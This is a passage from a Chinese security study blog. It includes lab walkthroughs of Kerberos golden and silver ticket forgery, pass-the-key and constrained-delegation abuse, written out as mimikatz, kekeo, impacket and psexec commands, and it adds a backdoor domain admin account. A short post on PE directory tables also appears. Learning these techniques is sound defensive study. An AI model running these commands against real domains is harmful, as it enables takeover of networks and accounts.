<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ticket:hack.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308173957253.png" class title="image-20220308173957253">



<p>清除之前的票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174152540.png" class title="image-20220308174152540">



<p>导入生成的黄金票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt hack.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174406051.png" class title="image-20220308174406051">



<p>可以正常访问域控，添加域管理员也可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user hack hack111!@ /add /domain</span><br><span class="line">net group &quot;domain admins&quot; hack /add /domain</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174434161.png" class title="image-20220308174434161">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174617592.png" class title="image-20220308174617592">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174630585.png" class title="image-20220308174630585">



<p><strong>impacket工具包制作</strong></p>
<p>先删除之前的票据</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308180406045.png" class title="image-20220308180406045">



<p>制作黄金票据，票据可以在本机做好传给普通域成员机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ticketer.py -nthash 6be58bfcc0a164af2408d1d3bd313c2a -domain-sid S-1-5-21-1315137663-3706837544-1429009142 -domain whoamianony.org administrator</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181640529.png" class title="image-20220308181640529">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181726991.png" class title="image-20220308181726991">



<p>更改域成员机环境配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=C:\administrator.ccache</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181807973.png" class title="image-20220308181807973">



<p>使用wmiexec来运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmiexec.exe whoamianony.org/administrator@DC -k -no-pass</span><br></pre></td></tr></table></figure>

<p>也可以直接访问域控</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308184724417.png" class title="image-20220308184724417">



<h3 id="六、制作白银票据伪造CIFS服务权限"><a href="#六、制作白银票据伪造CIFS服务权限" class="headerlink" title="六、制作白银票据伪造CIFS服务权限"></a>六、制作白银票据伪造CIFS服务权限</h3><p>CIFS：用于windows主机之间进行网络文件共享</p>
<p>同样需要域控的mimikatz获取一些信息</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308185345321.png" class title="image-20220308185345321">

<p>1、域名 WHOAMIANONY</p>
<p>2、域sid S-1-5-21-1315137663-3706837544-1429009142</p>
<p>3、服务账号的NTLM Hash ab89b1295e69d353dd7614c7a3a80cec</p>
<p>4、要伪造的用户名，随便填，常用administrator</p>
<p>5、域控ip 192.168.93.30</p>
<p>6、可利用的服务</p>
<p>制作银票再导入票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /target:DC.whoamianony.org /service:cifs /rc4:ab89b1295e69d353dd7614c7a3a80cec /user:administrator /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190455630.png" class title="image-20220308190455630">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190515961.png" class title="image-20220308190515961">

<p>之后还可以使用psexec.exe 与域控建立交互式cmd，并且还是最高权限，这是在域成员192.168.93.20上使用的psexec，kali可以打开远程桌面实现此功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.exe \\DC.whoamianony.org cmd.exe</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191224922.png" class title="image-20220308191224922">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191324307.png" class title="image-20220308191324307">

<p>这个administrator是我们命名为这个的，制作票据的时候也可以命名为aaa，bbb等</p>
<h1 id="PTK：Pass-The-Key（密钥传递攻击）"><a href="#PTK：Pass-The-Key（密钥传递攻击）" class="headerlink" title="PTK：Pass The Key（密钥传递攻击）"></a>PTK：Pass The Key（密钥传递攻击）</h1><h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><p>Kerberos 提供 4 种不同的密钥类型：DES、RC4、AES-128 和 AES-256</p>
<p>启用 RC4 etype 后，可以使用 RC4 密钥。问题是 RC4 密钥实际上是用户的 NT 哈希。使用 NT 散列获取 Kerberos 票证称为pass the hash</p>
<p>禁用 RC4 时，也可以传递其他 Kerberos 密钥（DES、AES-128、AES-256）。这种技术称为ptk。实际上，overpass hash 和 pass key 只是使用的 name 和 key 不同，技术是一样的。</p>
<p>传递的key是AES key，指定使用AES256</p>
<h2 id="PTK攻击的原理及条件"><a href="#PTK攻击的原理及条件" class="headerlink" title="PTK攻击的原理及条件"></a>PTK攻击的原理及条件</h2><p>1、可以在NTLM认证被禁止的情况下用来实现类似PtH的功能</p>
<p>2、需要目标用户帐户的 NTLM 哈希（或密码）</p>
<p>因此，一旦获得用户哈希，就可以为该帐户请求 TGT。最后，可以<strong>访问****用户帐户具有权限的</strong>任何服务或机器。</p>
<h2 id="PTK的各种攻击手法"><a href="#PTK的各种攻击手法" class="headerlink" title="PTK的各种攻击手法"></a>PTK的各种攻击手法</h2><h3 id="一、mimikatz-1"><a href="#一、mimikatz-1" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308192816206.png" class title="image-20220308192816206">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308193145797.png" class title="image-20220308193145797">

<p>不知道为什么这个机器没有aes-256。。</p>
<p>如果有的话在mimikatz输入 ，然后就可以进行远程连接了，可以进行dir \\DC\c$等操作，其实和pth非常类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:whoamianony.org /aes256:获取到的aes值</span><br></pre></td></tr></table></figure>

<h3 id="二、impacket工具包"><a href="#二、impacket工具包" class="headerlink" title="二、impacket工具包"></a>二、impacket工具包</h3><p>ptk也有很多impacket脚本使用，使用方法都大同小异，这里就不演示了。</p>
<p>总结：ptt&amp;pth&amp;ptk是域渗透中常见的横向移动与维权方法，之前刚学的时候，都只是大概知道怎么回事，时不时还会弄混，但是自己静下心来好好琢磨了一段时间过后发现其实这三种方法也不是很难，思路一下清晰了很多。对于文章来说的话，有些地方可能有小问题，有些地方还有不知原因的报错。但大体来说比较满意，因为文章只做自己复习学习用。</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>目录表结构与地址转换函数</title>
    <url>/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="数据目录表结构"><a href="#数据目录表结构" class="headerlink" title="数据目录表结构"></a>数据目录表结构</h1><p>先用LordPE看看基本的目录结构</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325091841547.png" class title="image-20220325091841547">



<p>用vs查看目录结构具体有哪些参数</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092100128.png" class title="image-20220325092100128">

<p>只有两个字段，一个是虚拟地址（数据目录表起始的位置），一个是尺寸（数据目录表结束的位置）</p>
<p>起始地址+尺寸&#x3D;结束的地址</p>
<p>vs用宏来定义数据目录结构</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092838107.png" class>

<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325094859726.png" class title="image-20220325094859726">

<p>使用LordPE的模板进行分析</p>
<p>可以看到上方是DOS头，下方是PE头</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183725633.png" class title="image-20220327183725633">



<p>先找到NT头（注意下方蓝色部分的变化）</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183905562.png" class title="image-20220327183905562">



<p>再找到NT头下的扩展头</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184051378.png" class title="image-20220327184051378">



<p>展开扩展头，最后一项就是数据目录表，展开数据目录表有各个具体的表</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184653232.png" class title="image-20220327184653232">



<p>随便展开一个数据表里面只有两个字段，一个是虚拟地址，一个是尺寸</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184835573.png" class title="image-20220327184835573">

<h1 id="写一个计算偏移的函数"><a href="#写一个计算偏移的函数" class="headerlink" title="写一个计算偏移的函数"></a>写一个计算偏移的函数</h1><p>先创建一个定义</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325095446911.png" class title="image-20220325095446911">



<p>开始写函数，要从DOS头开始解析，然后解析PE头，区段表，再判断目录表是否落在了头部，或者落在了某个区段内，需要分两种情况，返回的dwRva是不同的，具体的解析可以看下图</p>
<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325102410695.png" class title="image-20220325102410695">

]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>约束委派的原理及利用</title>
    <url>/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非约束性委派被委派的机器会直接得到发布委派的用户的TGT，是十分不安全的，因此微软推出了约束性委派，添加了s4u2self与s4u2proxy协议，以增加安全性。假设有这么一种情况，用户A委派service1去访问service2,那么大概的访问过程如下：</p>
<p>1、用户A访问service1。</p>
<p>2、service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。</p>
<p>3、service1以用户A的身份访问KDC通过s4u2proxy协议请求一个访问service2的可转发的ticket。</p>
<p>4、service1获取到ticket并以用户A的名义访问service2。</p>
<p>整个约束委派涉及到两个ticket票据，其实在我看来和kerbores的认证过程有异曲同工之妙，第一个ticket是证明service1可以代表用户A，第二个ticket代表service1可以代替用户A访问service2，只有kdc里面的tgs可以颁发ticket，所以这两个ticket都是由域控来授权的。</p>
<p>还是用上一篇博客引用的图片来解释一下</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316210130668.png" class title="image-20220316210130668">

<p>如果，hostB配置了约束委派，那么他就可以被任意用户A委派去访问hostC上特定的某一服务，比如cifs。与非约束委派的区别就是，限制了hostB可以访问的主机和此主机上的某个服务，但没有限制谁能对hostB发起委派请求。</p>
<p>那么s4u2self与s4u2proxy协议是什么呢？</p>
<p>s4u是对kerberos协议的一个拓展，s4u包含了两个子协议s4u2self和s4u2proxy，这两个协议都能向kdc发起票据请求。s4u2self是代表自己向kdc请求一个自己可以代表用户A的票据（ST），s4u2proxy是可以让service1以用户A的名义向kdc请求一个可以访问service2的票据。这两个票据有先后关系，service1必须先向kdc证明自己可以代表用户A（第一个票据），然后才能通过kdc的票据向service2发起请求（第二个票据）。一共向kdc发起了<strong>两次</strong>票据请求。</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316211012120.png" class title="image-20220316211012120">



<h1 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控    192.168.93.30   主机名DC</p>
<p>域成员  192.168.93.40  主机名PC2   用户名moretz</p>
<p>域控为域用户配置spn，为moretz用户配置约束委派，为DC机器的cifs服务做委派</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317095916068.png" class title="image-20220317095916068">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100047876.png" class title="image-20220317100047876">



<p>设置完成后</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100354131.png" class title="image-20220317100354131">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102956972.png" class title="image-20220317102956972">

<p>此时就配置完成了moretz（PC2）对DC的cifs的委派</p>
<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317101321257.png" class title="image-20220317101321257">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103143976.png" class title="image-20220317103143976">

<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102424078.png" class title="image-20220317102424078">

<p>过滤条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306368)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103023681.png" class title="image-20220317103023681">

<p>过滤条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>

<h2 id="0x02约束委派的攻击"><a href="#0x02约束委派的攻击" class="headerlink" title="0x02约束委派的攻击"></a>0x02约束委派的攻击</h2><h3 id="有明文密码或者ntml的条件下"><a href="#有明文密码或者ntml的条件下" class="headerlink" title="有明文密码或者ntml的条件下"></a>有明文密码或者ntml的条件下</h3><p>使用kekeo结合约束委派用户的明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /password:Moretz2021</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105105163.png" class title="image-20220317105105163">



<p>使用ntml hash也可以</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105506938.png" class title="image-20220317105506938">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /NTLM:抓到的hash值</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105620181.png" class title="image-20220317105620181">



<p>使用这个tgt通过伪造s4u请求以administrator用户身份请求访问DC的cifs的ST</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_moretz@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110301712.png" class title="image-20220317110301712">



<p>使用获得的s4u2proxy的tgt进行ptt</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110416001.png" class title="image-20220317110416001">

<p>在ptt之前不能访问DC的目录</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110502870.png" class title="image-20220317110502870">



<p>使用mimikatz进行ptt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110852382.png" class title="image-20220317110852382">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110914857.png" class title="image-20220317110914857">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111243140.png" class title="image-20220317111243140">

<p>注：这里也不是黄金票据，制作黄金票据的条件是缺一不可的</p>
<h3 id="无明文密码或hash的情况下直接从内存中导入票据"><a href="#无明文密码或hash的情况下直接从内存中导入票据" class="headerlink" title="无明文密码或hash的情况下直接从内存中导入票据"></a>无明文密码或hash的情况下直接从内存中导入票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111656366.png" class title="image-20220317111656366">



<p>然后可以直接伪造s4u请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;17bae4]-2-0-60a10000-moretz@krbtgt-WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112009861.png" class title="image-20220317112009861">



<p>现在是无法访问域控的</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112141194.png" class title="image-20220317112141194">

<p>然后使用mimikatz进行ptt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112242012.png" class title="image-20220317112242012">



<p>访问成功</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112612208.png" class title="image-20220317112612208">



<p>上面是域服务用户存在约束委派，如果是域主机存在约束委派</p>
<p>使用mimikatz抓取域主机PC2的ntml</p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317133949487.png" class title="image-20220317133949487">



<p>使用keko制作可以供PC2自己转发的tgt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:PC2$ /domain:whoamianony.org /NTLM:46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142007857.png" class title="image-20220317142007857">

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">

<p>这里的tgt是PC2向kdc请求的自己可转发的票据，不是ST1</p>
<p>使用请求到的tgt通过s4u协议伪造请求ST1，ST2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">



<p>未进行ptt之前是不能访问DC的 </p>
<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">

<p>使用mimikatz进行ptt,注意票据别选错了，要选经过s4u2proxy协议提供的可转发的ST2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">

